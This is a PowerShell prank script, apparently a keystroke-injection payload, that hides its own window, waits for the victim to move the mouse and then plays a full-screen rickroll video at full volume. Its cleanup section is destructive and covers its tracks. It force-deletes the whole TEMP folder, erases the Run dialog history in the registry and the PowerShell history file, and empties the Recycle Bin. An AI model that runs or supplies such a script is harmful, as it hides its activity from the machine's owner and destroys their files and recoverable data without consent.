# Hide the initial PowerShell window for stealth
$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
Add-Type -Name Win -Namespace Native -MemberDefinition $i
$handle = (Get-Process -Id $PID).MainWindowHandle
[Native.Win]::ShowWindow($handle, 0)

function Target-Comes {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell
    while ($true) {
        Start-Sleep -Seconds 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) { break }
        $o.SendKeys("{CAPSLOCK}")
    }
}

# WPF Window for full screen video
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel

[xml]$XAML = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" WindowState="Maximized" ResizeMode="NoResize" WindowStartupLocation="CenterScreen">
    <MediaElement Stretch="Fill" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop" />
</Window>
"@

# Video Path (use TEMP)
$videoFile = "$env:TEMP\rr.mp4"
[uri]$VideoSource = $videoFile

# Check if video exists
if (!(Test-Path $videoFile)) {
    [System.Windows.MessageBox]::Show("Video file not found: $videoFile")
    exit
}

# Load XAML
$XAMLReader = (New-Object System.Xml.XmlNodeReader $XAML)
$Window = [Windows.Markup.XamlReader]::Load($XAMLReader)
$VideoPlayer = $Window.FindName("VideoPlayer")

$VideoPlayer.Volume = 100
$VideoPlayer.Source = $VideoSource

# Wait for user input
Target-Comes

# Play video and show window
$VideoPlayer.Play()
$Window.ShowDialog() | Out-Null

# Ensure CAPSLOCK is off
Add-Type -AssemblyName System.Windows.Forms
if ([System.Windows.Forms.Control]::IsKeyLocked('CapsLock')) {
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
}

# Clean up
Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue